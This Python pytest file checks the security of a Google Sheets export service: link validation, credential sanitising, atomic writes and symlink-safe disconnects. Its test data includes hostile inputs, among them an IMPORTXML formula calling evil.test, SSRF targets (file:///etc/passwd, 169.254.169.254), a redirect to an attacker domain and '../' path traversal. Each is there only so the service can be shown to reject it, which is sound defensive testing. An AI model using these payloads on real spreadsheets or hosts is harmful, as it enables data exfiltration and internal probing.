"""Offline contract, credential boundary, and atomic-export tests."""

import json
import os
import stat
import threading
from concurrent.futures import ThreadPoolExecutor
from types import SimpleNamespace

import pytest
import requests
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

from app.services import google_sheets as sheets
from app.services.google_sheets import GoogleSheetsError, GoogleSheetsService, SheetTable

SPREADSHEET_ID = "aB_12-" * 5
OTHER_ID = "other_" * 5
EMAIL = "cathedra@test-project.iam.gserviceaccount.com"


@pytest.fixture(scope="module")
def credential_json():
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    return json.dumps(
        {
            "type": "service_account",
            "client_email": EMAIL,
            "private_key": key.private_bytes(
                serialization.Encoding.PEM,
                serialization.PrivateFormat.PKCS8,
                serialization.NoEncryption(),
            ).decode("ascii"),
            "private_key_id": "offline-test-key",
            "token_uri": sheets.TOKEN_URL,
            "universe_domain": "googleapis.com",
            # These untrusted fields must never reach the Google credential object.
            "subject": "administrator@example.test",
            "quota_project_id": "external-project",
            "client_x509_cert_url": "http://127.0.0.1/credentials",
        }
    )


@pytest.fixture
def service(tmp_path, credential_json):
    result = GoogleSheetsService(tmp_path)
    result.configure(SPREADSHEET_ID, credential_json)
    result._credentials = SimpleNamespace(valid=True, token="offline-token")
    return result


def metadata(*, owned=True, title="Cathedra Faculty", rows=8, columns=4):
    return {
        "spreadsheetId": SPREADSHEET_ID,
        "properties": {"title": "Offline workbook"},
        "sheets": [
            {
                "properties": {
                    "sheetId": 0,
                    "title": title,
                    "gridProperties": {"rowCount": rows, "columnCount": columns},
                },
                "developerMetadata": [
                    {
                        "metadataKey": sheets.OWNER_KEY,
                        "metadataValue": sheets.OWNER_VALUE,
                        "location": {"sheetId": 0},
                    }
                ]
                if owned
                else [],
            },
            {
                "properties": {
                    "sheetId": 20,
                    "title": "User notes",
                    "gridProperties": {"rowCount": 99, "columnCount": 8},
                }
            },
        ],
    }


class FakeTransport:
    def __init__(self, document=None, failure=None):
        self.document = document if document is not None else metadata()
        self.failure = failure
        self.calls = []
        self.closed = False

    def json_request(self, method, spreadsheet_id, token, *, payload=None):
        self.calls.append((method, spreadsheet_id, token, payload))
        if method == "POST" and self.failure:
            raise self.failure
        return self.document if method == "GET" else {"replies": []}

    def close(self):
        self.closed = True


@pytest.mark.parametrize(
    "value",
    [
        SPREADSHEET_ID,
        f"https://docs.google.com/spreadsheets/d/{SPREADSHEET_ID}",
        f"https://docs.google.com/spreadsheets/d/{SPREADSHEET_ID}/edit?usp=sharing#gid=0",
    ],
)
def test_accepts_exact_google_sheet_links(value):
    assert sheets._spreadsheet_id(value) == SPREADSHEET_ID


@pytest.mark.parametrize(
    "value",
    [
        "https://evil.example/spreadsheets/d/" + SPREADSHEET_ID,
        "https://docs.google.com.evil.example/spreadsheets/d/" + SPREADSHEET_ID,
        "https://user@docs.google.com/spreadsheets/d/" + SPREADSHEET_ID,
        "https://docs.google.com:443/spreadsheets/d/" + SPREADSHEET_ID,
        "http://docs.google.com/spreadsheets/d/" + SPREADSHEET_ID,
        "https://docs.google.com/spreadsheets/d/" + SPREADSHEET_ID + "/export",
        "https://docs.google.com/spreadsheets/d/../../token",
        "https://docs.google.com/spreadsheets/d/" + ("x" * 201),
        "short",
        "file:///etc/passwd",
        "http://169.254.169.254/latest/meta-data",
    ],
)
def test_rejects_arbitrary_endpoints(value):
    with pytest.raises(GoogleSheetsError) as error:
        sheets._spreadsheet_id(value)
    assert error.value.status_code == 422


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("type", "authorized_user"),
        ("client_email", "me@example.com"),
        ("token_uri", "https://oauth2.googleapis.com/token?redirect=evil"),
        ("token_uri", "http://127.0.0.1/token"),
        ("universe_domain", "evil.example"),
        ("private_key", "PRIVATE-KEY-MATERIAL-DO-NOT-LEAK"),
    ],
)
def test_credentials_are_validated_before_saving(tmp_path, credential_json, field, value):
    info = json.loads(credential_json)
    info[field] = value
    service = GoogleSheetsService(tmp_path)
    with pytest.raises(GoogleSheetsError) as error:
        service.configure(SPREADSHEET_ID, json.dumps(info))
    assert error.value.status_code == 422
    assert "PRIVATE-KEY-MATERIAL" not in str(error.value)
    assert service.status()["configured"] is False
    assert not service._path.exists()


def test_credentials_are_sanitized_and_saved_privately_without_network(
    tmp_path, credential_json, monkeypatch
):
    monkeypatch.setattr(
        requests.Session, "request", lambda *a, **k: pytest.fail("Unexpected network request")
    )
    service = GoogleSheetsService(tmp_path)
    status = service.configure(SPREADSHEET_ID, credential_json)
    assert status["ready"] is True
    assert status["service_account_email"] == EMAIL
    assert status["last_result"] is None
    assert service._credentials.scopes == [sheets.SHEETS_SCOPE]
    assert service._credentials._subject is None
    assert service._credentials.quota_project_id is None
    assert service._info.keys() == {
        "type",
        "client_email",
        "private_key",
        "private_key_id",
        "token_uri",
        "universe_domain",
    }
    saved = service._path.read_text(encoding="utf-8")
    assert "PRIVATE KEY" not in json.dumps(status)
    if os.name == "nt":
        assert "PRIVATE KEY" not in saved
        assert '"protection": "windows-dpapi"' in saved
    else:
        assert stat.S_IMODE(service._path.stat().st_mode) == 0o600
        assert stat.S_IMODE(service._directory.stat().st_mode) == 0o700
    reloaded = GoogleSheetsService(tmp_path)
    assert reloaded.status() == service.status()
    assert reloaded._info["private_key"] == json.loads(credential_json)["private_key"]


def test_single_atomic_batch_clears_old_values_and_uses_literal_cells(service, monkeypatch):
    transport = FakeTransport()
    monkeypatch.setattr(service, "_make_transport", lambda: transport)
    result = service.update(
        [
            SheetTable(
                "Cathedra Faculty",
                ["Name", "Hours", "Active"],
                [['=IMPORTXML("https://evil.test")', 5, True], ["+SUM(A1)", None, False]],
            )
        ]
    )
    assert [call[0] for call in transport.calls] == ["GET", "POST"]
    batch = json.loads(transport.calls[-1][3])
    assert len(batch["requests"]) == 1
    update = batch["requests"][0]["updateCells"]
    assert update["range"] == {
        "sheetId": 0,
        "startRowIndex": 0,
        "endRowIndex": 8,
        "startColumnIndex": 0,
        "endColumnIndex": 4,
    }
    assert update["fields"] == "userEnteredValue"
    assert update["rows"][1]["values"] == [
        {"userEnteredValue": {"stringValue": '=IMPORTXML("https://evil.test")'}},
        {"userEnteredValue": {"numberValue": 5}},
        {"userEnteredValue": {"boolValue": True}},
    ]
    assert "formulaValue" not in json.dumps(batch)
    assert result["last_result"] == "success"
    assert result["last_updated_at"]
    assert result["row_counts"] == [{"title": "Cathedra Faculty", "rows": 2}]
    assert transport.closed


def test_creates_owned_tabs_and_grows_grids_in_same_atomic_batch():
    payload, counts = sheets._batch(
        [
            SheetTable("Cathedra Faculty", ["Name", "Hours"], [["A", 8], ["B", 4]]),
            SheetTable("Cathedra Overview", ["Updated"], [["now"]]),
        ],
        metadata(rows=1, columns=1),
    )
    operations = json.loads(payload)["requests"]
    assert operations[0]["updateSheetProperties"]["properties"]["gridProperties"] == {
        "rowCount": 3,
        "columnCount": 2,
    }
    added = next(item["addSheet"] for item in operations if "addSheet" in item)
    marker = next(
        item["createDeveloperMetadata"] for item in operations if "createDeveloperMetadata" in item
    )
    assert added["properties"]["sheetId"] not in (0, 20)
    assert marker["developerMetadata"]["location"] == {"sheetId": added["properties"]["sheetId"]}
    assert marker["developerMetadata"]["metadataKey"] == sheets.OWNER_KEY
    assert len(counts) == 2
    assert all(
        item.get("updateCells", {}).get("range", {}).get("sheetId") != 20 for item in operations
    )


@pytest.mark.parametrize(
    "document",
    [
        metadata(owned=False),
        {
            **metadata(),
            "sheets": [
                {
                    **metadata()["sheets"][0],
                    "developerMetadata": [
                        {
                            "metadataKey": sheets.OWNER_KEY,
                            "metadataValue": sheets.OWNER_VALUE,
                            "location": {"sheetId": 77},
                        }
                    ],
                }
            ],
        },
    ],
)
def test_never_overwrites_unowned_or_falsely_marked_tabs(service, monkeypatch, document):
    transport = FakeTransport(document=document)
    monkeypatch.setattr(service, "_make_transport", lambda: transport)
    with pytest.raises(GoogleSheetsError) as error:
        service.update([SheetTable("Cathedra Faculty", ["Name"], [["Test"]])])
    assert error.value.status_code == 409
    assert [call[0] for call in transport.calls] == ["GET"]
    assert service.status()["last_updated_at"] is None


def test_timeout_preserves_success_time_and_counts_and_reports_uncertainty(service, monkeypatch):
    monkeypatch.setattr(service, "_make_transport", lambda: FakeTransport())
    previous = service.update([SheetTable("Cathedra Faculty", ["Name"], [["Old"]])])
    failed = FakeTransport(failure=requests.Timeout("PRIVATE-KEY-MATERIAL"))
    monkeypatch.setattr(service, "_make_transport", lambda: failed)
    with pytest.raises(GoogleSheetsError) as error:
        service.update([SheetTable("Cathedra Faculty", ["Name"], [["New"], ["Newer"]])])
    assert "PRIVATE-KEY-MATERIAL" not in str(error.value)
    assert "Overview" in error.value.message
    after = service.status()
    assert after["last_result"] == "uncertain"
    assert after["last_updated_at"] == previous["last_updated_at"]
    assert after["row_counts"] == previous["row_counts"]


def test_protected_sheet_rejection_never_reports_success(service, monkeypatch):
    transport = FakeTransport(failure=GoogleSheetsError(502, "Google rejected the protected tab."))
    monkeypatch.setattr(service, "_make_transport", lambda: transport)
    with pytest.raises(GoogleSheetsError):
        service.update([SheetTable("Cathedra Faculty", ["Name"], [["Test"]])])
    assert len(transport.calls) == 2
    assert service.status()["last_result"] == "error"
    assert service.status()["last_updated_at"] is None
    assert service.status()["row_counts"] == []


def test_connection_reads_metadata_and_preserves_sync_history(service, monkeypatch):
    monkeypatch.setattr(service, "_make_transport", lambda: FakeTransport())
    previous = service.update([SheetTable("Cathedra Faculty", ["Name"], [["Old"]])])
    transport = FakeTransport()
    monkeypatch.setattr(service, "_make_transport", lambda: transport)
    result = service.test_connection()
    assert [call[0] for call in transport.calls] == ["GET"]
    assert "read access only" in result["message"]
    assert result["last_updated_at"] == previous["last_updated_at"]
    assert result["last_result"] == previous["last_result"]
    assert result["row_counts"] == previous["row_counts"]


def test_expected_spreadsheet_is_compared_before_network(service, monkeypatch):
    monkeypatch.setattr(
        service, "_make_transport", lambda: pytest.fail("Unexpected network access")
    )
    with pytest.raises(GoogleSheetsError) as error:
        service.update(
            [SheetTable("Cathedra Faculty", ["Name"], [])], expected_spreadsheet_id=OTHER_ID
        )
    assert error.value.status_code == 409
    assert service.status()["last_result"] is None


def test_configure_and_disconnect_wait_for_in_flight_update(service, monkeypatch):
    started, release, disconnect_started = threading.Event(), threading.Event(), threading.Event()

    class BlockingTransport(FakeTransport):
        def json_request(self, method, spreadsheet_id, token, *, payload=None):
            if method == "GET":
                started.set()
                assert release.wait(5)
            return super().json_request(method, spreadsheet_id, token, payload=payload)

    monkeypatch.setattr(service, "_make_transport", BlockingTransport)

    def disconnect():
        disconnect_started.set()
        return service.disconnect()

    with ThreadPoolExecutor(max_workers=2) as executor:
        update = executor.submit(service.update, [SheetTable("Cathedra Faculty", ["Name"], [])])
        assert started.wait(5)
        removal = executor.submit(disconnect)
        assert disconnect_started.wait(5)
        assert not removal.done()
        release.set()
        assert update.result(timeout=5)["last_result"] == "success"
        assert removal.result(timeout=5)["configured"] is False
    assert not service._path.exists()


@pytest.mark.parametrize("value", [float("nan"), float("inf"), object()])
def test_invalid_values_fail_before_write(service, monkeypatch, value):
    transport = FakeTransport()
    monkeypatch.setattr(service, "_make_transport", lambda: transport)
    with pytest.raises(GoogleSheetsError):
        service.update([SheetTable("Cathedra Faculty", ["Name"], [[value]])])
    assert [call[0] for call in transport.calls] == ["GET"]


def test_payload_size_bound(service, monkeypatch):
    transport = FakeTransport()
    monkeypatch.setattr(service, "_make_transport", lambda: transport)
    monkeypatch.setattr(sheets, "MAX_PAYLOAD_BYTES", 100)
    with pytest.raises(GoogleSheetsError) as error:
        service.update([SheetTable("Cathedra Faculty", ["Name"], [["Test"]])])
    assert error.value.status_code == 413
    assert [call[0] for call in transport.calls] == ["GET"]


def test_transport_rejects_oauth_redirects_and_dynamic_endpoints(monkeypatch):
    transport = sheets._Transport()
    calls = []

    def request(method, url, **kwargs):
        calls.append((method, url, kwargs))
        return SimpleNamespace(
            status_code=302, content=b"redirect", headers={"Location": "https://evil.test"}
        )

    monkeypatch.setattr(transport.session, "request", request)
    response = transport.oauth_request(sheets.TOKEN_URL, method="POST", body=b"assertion")
    assert response.status == 302
    assert calls[0][1] == sheets.TOKEN_URL
    assert calls[0][2]["allow_redirects"] is False
    assert 0 < calls[0][2]["timeout"].total <= 12
    assert transport.session.trust_env is False
    with pytest.raises(GoogleSheetsError):
        transport.oauth_request(sheets.TOKEN_URL, method="POST")
    with pytest.raises(GoogleSheetsError):
        sheets._Transport().oauth_request("https://evil.test/token", method="POST")
    transport.close()


def test_google_error_body_is_not_exposed(monkeypatch):
    transport = sheets._Transport()
    monkeypatch.setattr(
        transport.session,
        "request",
        lambda *a, **k: SimpleNamespace(
            status_code=403, content=b"PRIVATE-KEY-MATERIAL", headers={}
        ),
    )
    with pytest.raises(GoogleSheetsError) as error:
        transport.json_request("GET", SPREADSHEET_ID, "token")
    assert error.value.status_code == 403
    assert "PRIVATE-KEY-MATERIAL" not in str(error.value)
    transport.close()


def test_unreadable_local_credentials_allow_reconnect_and_disconnect(tmp_path, credential_json):
    directory = tmp_path / ".google-sheets"
    directory.mkdir()
    connection = directory / "connection.json"
    connection.write_text('{"version": 1, "credentials": "PRIVATE-KEY-MATERIAL"}', encoding="utf-8")
    service = GoogleSheetsService(tmp_path)
    assert service.status()["ready"] is False
    assert "PRIVATE-KEY-MATERIAL" not in json.dumps(service.status())
    assert "Reconnect" in service.status()["message"]
    assert service.configure(SPREADSHEET_ID, credential_json)["ready"] is True
    assert "message" not in service.status()
    connection.write_text("unreadable", encoding="utf-8")
    replacement = GoogleSheetsService(tmp_path)
    assert replacement.disconnect()["configured"] is False
    assert not connection.exists()


def test_retarget_preserves_key_but_resets_old_workbook_history(service, monkeypatch):
    monkeypatch.setattr(service, "_make_transport", lambda: FakeTransport())
    previous = service.update([SheetTable("Cathedra Faculty", ["Name"], [["Old"]])])
    unchanged = service.configure(SPREADSHEET_ID, None)
    assert unchanged["last_updated_at"] == previous["last_updated_at"]
    changed = service.configure(OTHER_ID, None)
    assert changed["service_account_email"] == EMAIL
    assert changed["last_updated_at"] is None
    assert changed["last_result"] is None
    assert changed["row_counts"] == []


@pytest.mark.parametrize("status_code", [408, 500, 503])
def test_ambiguous_http_write_outcome_is_reported_as_uncertain(service, monkeypatch, status_code):
    transport = sheets._Transport()
    responses = iter(
        [
            SimpleNamespace(status_code=200, json=lambda: metadata()),
            SimpleNamespace(status_code=status_code, content=b"PRIVATE-KEY-MATERIAL"),
        ]
    )
    monkeypatch.setattr(transport, "request", lambda *args, **kwargs: next(responses))
    monkeypatch.setattr(service, "_make_transport", lambda: transport)
    with pytest.raises(GoogleSheetsError) as error:
        service.update([SheetTable("Cathedra Faculty", ["Name"], [])])
    assert error.value.status_code == 504
    assert service.status()["last_result"] == "uncertain"
    assert "PRIVATE-KEY-MATERIAL" not in str(error.value)


def test_destination_connections_have_independent_persisted_keys_history_and_disconnect(
    tmp_path, credential_json, monkeypatch
):
    legacy = GoogleSheetsService(tmp_path)
    legacy.configure("legacy-spreadsheet-identifier-only", credential_json)
    legacy_bytes = legacy._path.read_bytes()
    services = {}
    for index, destination in enumerate(sheets.DESTINATIONS):
        service = GoogleSheetsService(tmp_path, destination=destination)
        assert service.status()["configured"] is False
        info = json.loads(credential_json)
        info["client_email"] = f"{destination}@test-project.iam.gserviceaccount.com"
        spreadsheet_id = f"synthetic-{destination}-sheet-identifier"
        service.configure(spreadsheet_id, json.dumps(info))
        service._credentials = SimpleNamespace(valid=True, token=f"token-{destination}")
        transport = FakeTransport(document={"sheets": [], "properties": {"title": destination}})
        monkeypatch.setattr(service, "_make_transport", lambda value=transport: value)
        service.update([SheetTable("Cathedra Overview", ["Record"], [[index]])])
        services[destination] = service
    for destination, service in services.items():
        restored = GoogleSheetsService(tmp_path, destination=destination)
        assert restored.status() == service.status()
        assert restored.status()["spreadsheet_id"] == f"synthetic-{destination}-sheet-identifier"
        assert (
            restored._info["client_email"] == f"{destination}@test-project.iam.gserviceaccount.com"
        )
        assert restored._path.name == f"connection-{destination}.json"
        assert restored.status()["last_result"] == "success"
    kept = {
        name: value._path.read_bytes() for name, value in services.items() if name != "overload"
    }
    assert services["overload"].disconnect()["configured"] is False
    assert GoogleSheetsService(tmp_path, destination="overload").status()["configured"] is False
    assert all(services[name]._path.read_bytes() == content for name, content in kept.items())
    assert legacy._path.read_bytes() == legacy_bytes


@pytest.mark.parametrize("first", [None, "workloads", "overload", "profiles"])
def test_destination_spreadsheet_ids_cannot_overlap_legacy_or_other_destinations(
    tmp_path, credential_json, first
):
    selected = GoogleSheetsService(tmp_path, destination=first)
    selected.configure(SPREADSHEET_ID, credential_json)
    # Saving the same destination and ID remains supported.
    assert selected.configure(SPREADSHEET_ID, None)["ready"] is True
    for destination in (None, *sheets.DESTINATIONS):
        if destination == first:
            continue
        other = GoogleSheetsService(tmp_path, destination=destination)
        with pytest.raises(GoogleSheetsError) as caught:
            other.configure(SPREADSHEET_ID, credential_json)
        assert caught.value.status_code == 409
        assert other.status()["configured"] is False
        assert not other._path.exists()
    selected.disconnect()
    assert (
        GoogleSheetsService(tmp_path, destination="profiles").configure(
            SPREADSHEET_ID, credential_json
        )["ready"]
        is True
    )


def test_concurrent_destination_saves_cannot_claim_the_same_spreadsheet(tmp_path, credential_json):
    services = [GoogleSheetsService(tmp_path, destination=name) for name in sheets.DESTINATIONS]
    start = threading.Barrier(len(services))

    def connect(service):
        start.wait(timeout=5)
        try:
            service.configure(SPREADSHEET_ID, credential_json)
            return 200
        except GoogleSheetsError as error:
            return error.status_code

    with ThreadPoolExecutor(max_workers=3) as executor:
        outcomes = list(executor.map(connect, services))
    assert sorted(outcomes) == [200, 409, 409]
    assert sum(service._path.exists() for service in services) == 1


def test_unreadable_other_connection_blocks_reuse_without_exposing_private_settings(
    tmp_path, credential_json
):
    directory = tmp_path / ".google-sheets"
    directory.mkdir()
    (directory / "connection.json").write_text("PRIVATE-CREDENTIAL-MATERIAL", encoding="utf-8")
    service = GoogleSheetsService(tmp_path, destination="profiles")
    with pytest.raises(GoogleSheetsError) as caught:
        service.configure(SPREADSHEET_ID, credential_json)
    assert caught.value.status_code == 409
    assert "PRIVATE-CREDENTIAL-MATERIAL" not in caught.value.message
    assert service.status()["configured"] is False
    GoogleSheetsService(tmp_path).disconnect()
    assert service.configure(SPREADSHEET_ID, credential_json)["configured"] is True


@pytest.mark.parametrize("destination", ["combined", "../connection", "unknown"])
def test_invalid_destination_cannot_select_arbitrary_configuration_path(tmp_path, destination):
    with pytest.raises(GoogleSheetsError) as caught:
        GoogleSheetsService(tmp_path, destination=destination)
    assert caught.value.status_code == 422
    assert not (tmp_path / ".google-sheets").exists()


def test_service_cache_is_partitioned_by_data_directory_and_destination(tmp_path, monkeypatch):
    import app.db

    monkeypatch.setattr(app.db, "DB_PATH", tmp_path / "cathedra.db")
    first = sheets.get_google_sheets_destination_service("profiles")
    assert sheets.get_google_sheets_destination_service("profiles") is first
    assert sheets.get_google_sheets_destination_service("workloads") is not first
    assert sheets.get_google_sheets_service() is not first
    monkeypatch.setattr(app.db, "DB_PATH", tmp_path / "other-data" / "cathedra.db")
    assert sheets.get_google_sheets_destination_service("profiles") is not first


@pytest.mark.parametrize("destination", [None, "workloads", "overload", "profiles"])
def test_unreadable_saved_destination_offers_safe_disconnect_recovery(tmp_path, destination):
    service = GoogleSheetsService(tmp_path, destination=destination)
    assert service.status()["configured"] is False
    service._directory.mkdir()
    service._path.write_text("SYNTHETIC-PRIVATE-MATERIAL", encoding="utf-8")
    service = GoogleSheetsService(tmp_path, destination=destination)
    status = service.status()
    assert status["configured"] is True
    assert status["ready"] is False
    assert status["service_account_email"] is None
    assert status["spreadsheet_id"] is None
    assert "Reconnect" in status["message"]
    assert "SYNTHETIC-PRIVATE-MATERIAL" not in json.dumps(status)
    assert service.disconnect()["configured"] is False
    assert not service._path.exists()


def test_connection_file_symlink_disconnect_keeps_its_target(tmp_path):
    target = tmp_path / "private-target.json"
    target.write_text("SYNTHETIC-PRIVATE-MATERIAL", encoding="utf-8")
    service = GoogleSheetsService(tmp_path, destination="profiles")
    service._directory.mkdir()
    try:
        service._path.symlink_to(target)
    except OSError:
        pytest.skip("Creating symbolic links requires OS permissions")
    restored = GoogleSheetsService(tmp_path, destination="profiles")
    assert restored.status()["configured"] is True
    assert restored.status()["ready"] is False
    assert "SYNTHETIC-PRIVATE-MATERIAL" not in json.dumps(restored.status())
    restored.disconnect()
    assert not restored._path.is_symlink()
    assert target.read_text(encoding="utf-8") == "SYNTHETIC-PRIVATE-MATERIAL"


def test_linked_settings_directory_is_not_followed_when_disconnecting(tmp_path):
    target = tmp_path / "other-private-settings"
    target.mkdir()
    selected = target / "connection-profiles.json"
    selected.write_text("SYNTHETIC-PRIVATE-MATERIAL", encoding="utf-8")
    service = GoogleSheetsService(tmp_path, destination="profiles")
    try:
        service._directory.symlink_to(target, target_is_directory=True)
    except OSError:
        pytest.skip("Creating symbolic links requires OS permissions")
    restored = GoogleSheetsService(tmp_path, destination="profiles")
    assert restored.status()["configured"] is True
    assert restored.status()["ready"] is False
    with pytest.raises(GoogleSheetsError) as caught:
        restored.disconnect()
    assert caught.value.status_code == 409
    assert selected.read_text(encoding="utf-8") == "SYNTHETIC-PRIVATE-MATERIAL"
    assert service._directory.is_symlink()
